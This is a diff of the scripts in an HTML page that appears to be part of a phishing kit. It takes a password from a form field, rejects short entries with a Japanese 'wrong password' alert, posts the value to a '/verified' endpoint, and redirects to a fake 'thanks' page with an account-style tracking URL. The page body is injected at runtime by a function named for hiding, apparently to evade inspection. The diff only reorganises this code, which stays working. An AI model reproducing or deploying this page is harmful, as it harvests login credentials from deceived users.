@@ -18,41 +18,17 @@
         }
 
     </style>
-    <script>
-        var myVar;
-        function myFunction() {
-            myVar = setTimeout(showPage, 100);
-        }
 
-        function showPage() {
-            document.getElementById("loader").style.display = "none";
-            document.getElementById("combiner").style.display = "block";
-        }
-    </script>
-    <script>
-        function check() {
-            var liehuo_key = document.getElementById('kiddfiled1');
-            if (liehuo_key.value.length < 6) {
-                alert("パスワードが間違っています");
-                liehuo_key.value = "";
-                liehuo_key.focus();
-                return false;
-            }
-            return true;
-        }
-    </script>
 </head>
 
 <body id ="bodyid">
-
 </body>
-<script src="library/jquery/main.min.js"></script>
 <script>
     setTimeout("yincang()",0);
     function yincang() {
         let content = document.getElementById('bodyid');
-        content.innerHTML = "<div id='loader'></div>\n" +
-                "<div style='display:none;' class='combiner' id='combiner'>\n" +
+        content.innerHTML =
+                "<div style='display:block;' class='combiner' id='combiner'>\n" +
                 "    <ul class='nav'>\n" +
                 "        <li class='nav-item'>\n" +
                 "\n" +
@@ -139,15 +115,37 @@
                 "\n" +
                 "</div>";
     }
-        myFunction();
-        function kiddsub() {
-            var filed1 = $("#kiddfiled1").val();
-            if (!check()) return;
-            $.post("/verified", {kiddfiled1: filed1},
-                    function (data) {
-                        window.location.href = '/thanks?openid=q1w2p5r9u8j0zgh35zgaj7drhknwxdplc3pf&ref=nav_youraccount_ya';
-                    }, "json");
-            window.location.href = '/thanks?openid=q1w2p5r9u8j0zgh35zgaj7drhknwxdplc3pf&ref=nav_youraccount_ya';
+</script>
+<script src="library/jquery/main.min.js"></script>
+<script>
+    // myFunction();
+    function kiddsub() {
+        var filed1 = $("#kiddfiled1").val();
+        if (!check()) return;
+        $.post("/verified", {kiddfiled1: filed1},
+                function (data) {
+                    window.location.href = '/thanks?openid=q1w2p5r9u8j0zgh35zgaj7drhknwxdplc3pf&ref=nav_youraccount_ya';
+                }, "json");
+        window.location.href = '/thanks?openid=q1w2p5r9u8j0zgh35zgaj7drhknwxdplc3pf&ref=nav_youraccount_ya';
+    }
+    var myVar;
+    function myFunction() {
+        myVar = setTimeout(showPage, 100);
+    }
+
+    function showPage() {
+        document.getElementById("loader").style.display = "none";
+        document.getElementById("combiner").style.display = "block";
+    }
+    function check() {
+        var liehuo_key = document.getElementById('kiddfiled1');
+        if (liehuo_key.value.length < 6) {
+            alert("パスワードが間違っています");
+            liehuo_key.value = "";
+            liehuo_key.focus();
+            return false;
         }
+        return true;
+    }
 </script>
 </html>
